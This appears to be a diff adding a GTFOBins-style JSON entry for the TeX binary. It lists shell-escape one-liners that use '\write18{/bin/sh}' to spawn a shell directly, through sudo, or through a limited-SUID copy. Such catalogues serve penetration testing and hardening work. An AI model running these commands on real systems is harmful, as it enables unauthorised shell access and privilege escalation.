@@ -1,0 +1,19 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "tex --shell-escape '\\write18{/bin/sh}\\end'\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo tex --shell-escape '\\write18{/bin/sh}\\end'\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "./tex --shell-escape '\\write18{/bin/sh}\\end'\n"
+      }
+    ]
+  }
+}
